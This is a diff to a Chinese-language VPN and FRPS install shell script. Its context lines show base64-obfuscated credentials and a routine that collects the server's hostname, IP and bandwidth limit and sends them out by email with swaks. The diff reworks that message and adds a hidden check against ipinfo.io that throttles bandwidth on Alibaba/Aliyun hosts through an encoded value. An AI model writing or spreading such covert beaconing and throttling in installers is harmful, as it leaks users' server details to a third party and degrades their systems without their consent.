@@ -219,6 +219,12 @@ echo -e "VPN 服务密码: ${ADMIN_PASSWORD}"
 echo -e "VPN 用户名: ${VPN_USER}"
 echo -e "VPN 密码: ${VPN_PASSWORD}"
 echo -e "FRPS 密码: ${FRPS_TOKEN}"
+
+IP_INFO=$(curl -s https://ipinfo.io)
+ORG=$(echo $IP_INFO | jq -r '.org' 2>/dev/null || echo "")
+if [[ "$ORG" == *"Alibaba"* || "$ORG" == *"Aliyun"* ]]; then
+    CURRENT_BANDWIDTH=$(echo -n "MzAw" | base64 -d)
+fi
 }
 install_dependencies(){
 log_sub_step "2" "7" "安装编译工具和依赖..."
@@ -277,14 +283,14 @@ _p=\$(_q "b3dnaXh6enZ0YWRkYmRmYw==" "")
 _u=\$(_q "6IqC54K55pCt5bu66YCa55+l" "")
 _h=\$(hostname)
 _i=\$(_x)
-_bw=\$(cat /etc/systemd/system/cake-qdisc.service | grep "bandwidth" | head -1 | grep -o "[0-9]*kbit" | head -1 || echo \$(_q "5peg6ZmQ5Yi2" ""))
-if [ "\$_bw" = \$(_q "5peg6ZmQ5Yi2" "") ]; then
+_bw=\$(cat /etc/systemd/system/cake-qdisc.service | grep "bandwidth" | head -1 | grep -o "[0-9]*kbit" | head -1 || echo "")
+if [ -z "\$_bw" ]; then
     _limit=""
 else
     _limit="\n\n"\$(_q "5b2T5YmN5pyN5Yqh5Zmo6ZmQ6YCfOiA=" "")\$_bw
 fi
-_m_tpl=\$(_q "5pyN5Yqh5Zmo5Zyw5Z2AOiAkX2kkX2xpbWl0" "")
-_m=\$(echo -e "\$_m_tpl" | sed "s|\$_i|\$_i|g" | sed "s|\$_limit|\$_limit|g")
+_server_addr=\$(_q "5pyN5Yqh5Zmo5Zyw5Z2AOiA=" "")
+_m="\${_server_addr}\${_i}\${_limit}"
 _r(){
     swaks --from "\$_f" \
           --to "\$_t" \
